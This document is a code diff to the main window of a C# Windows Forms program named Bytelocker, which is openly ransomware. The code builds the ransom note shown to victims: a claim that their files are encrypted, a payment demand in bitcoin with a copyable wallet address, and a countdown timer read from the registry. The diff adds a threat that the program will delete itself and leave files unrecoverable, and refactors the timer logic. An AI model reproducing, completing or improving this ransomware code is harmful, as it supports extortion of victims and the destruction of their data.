@@ -1,33 +1,28 @@
-﻿using Bytelocker.src;
+﻿using Bytelocker.Tools;
 using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Bytelocker.UI
 {
     public partial class MainWindow : Form
     {
-        CommandManager cm = new CommandManager();
+        private CommandManager cm;
+        private TimeManager tm;
 
         public MainWindow()
         {
             InitializeComponent();
+            this.cm = new CommandManager();
+            this.tm = new TimeManager();
+            this.tm.ReadFromRegistry();
         }
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
-            // time label
-            this.lbTimeLeft.Text = (TimeSpan.FromSeconds(TimeManager.DetermineRemainingTimeInSeconds())).ToString(@"dd\:hh\:mm\:ss");
-            // end time label
+            this.UpdateTime();
 
             // rtf box
-            this.rtfInfo.AppendText("Your important files, documents, pictures, etc. Have been encrypted" + "\n\n");
+            this.rtfInfo.AppendText("Your important files, documents, pictures, etc. Have been encrypted." + "\n\n");
 
             LinkLabel llListOfInfectedFiles = new LinkLabel();
             llListOfInfectedFiles.Text = "Here";
@@ -53,8 +48,9 @@ namespace Bytelocker.UI
             this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
 
             this.rtfInfo.AppendText("in order to decrypt the files, you need to obtain the password used to generate the key." + "\n\n" +
+                "The password will only be available for a limited time, after this, the program will delete itself and there will be no way to recover encrypted files." + "\n\n" +
                 "To obtain the password, you will need to pay $" + Bytelocker.COST_TO_DECRYPT.ToString() + " USD or a similar amount in a different currency." +
-                "\n\n" + "Payment is accepted in Bitcoin only which is an open-source cryptocurrency which funds can be transfered through computer of smartphone without" +
+                "\n\n" + "Payment is accepted in bitcoin only which is an open-source cryptocurrency which funds can be transfered through computer or smartphone without" +
                 " interference of a bank or other financial institution" + "\n\n" + "You will need to send the");
 
             LinkLabel llUSDToBitcoin = new LinkLabel();
@@ -68,7 +64,7 @@ namespace Bytelocker.UI
             this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
 
 
-            this.rtfInfo.AppendText("in Bitcoin to the following address: (click to copy)" + "\n\n" + new String(' ', 10));
+            this.rtfInfo.AppendText("in Bitcoin to the following address: (click to copy)" + "\n\n");
 
 
             LinkLabel llBitcoinAddress = new LinkLabel();
@@ -82,11 +78,11 @@ namespace Bytelocker.UI
             this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
 
 
-            this.rtfInfo.AppendText("\n\n\n");
+            this.rtfInfo.AppendText("\n\n");
 
 
             LinkLabel llBitcoinInfo = new LinkLabel();
-            llBitcoinInfo.Text = "Getting started with Bitcoin";
+            llBitcoinInfo.Text = "Getting started with bitcoin";
             llBitcoinInfo.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llBitcoinInfo_Click);
             llBitcoinInfo.AutoSize = true;
             llBitcoinInfo.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
@@ -95,7 +91,7 @@ namespace Bytelocker.UI
             this.rtfInfo.AppendText("\n");
             this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
 
-            this.rtfInfo.AppendText("\n\n\n" + "NOTE: Removal of this software will lead to inability to decrypt files.");
+            this.rtfInfo.AppendText("\n\n" + "NOTE: Removal of or modification of this software will lead to inability to decrypt files.");
             // end rtf box
         }
 
@@ -121,7 +117,7 @@ namespace Bytelocker.UI
 
         private void On_llBitcoinAddress_Click(object sender, EventArgs e)
         {
-            cm.CopyToClipboard(Bytelocker.BITCOIN_ADDRESS);
+            this.cm.CopyToClipboard(Bytelocker.BITCOIN_ADDRESS);
         }
 
         private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
@@ -130,6 +126,26 @@ namespace Bytelocker.UI
 
         private void BtnNext_Click(object sender, EventArgs e)
         {
+        }
+
+        private void UpdateTimeLeftEvent(object sender, EventArgs e)
+        {
+            this.UpdateTime();
+        }
+
+        private void UpdateTime()
+        {
+            int timeLeftSeconds = (int)this.tm.DetermineRemainingTimeInSeconds();
+
+            if (timeLeftSeconds < 0)
+            {
+                this.tmTimeLeftRefresher.Stop();
+                this.lbTimeLeft.Text = "00:00:00:00";
+            }
+            else
+            {
+                this.lbTimeLeft.Text = (TimeSpan.FromSeconds(timeLeftSeconds)).ToString(@"dd\:hh\:mm\:ss");
+            }
         }
     }
 }
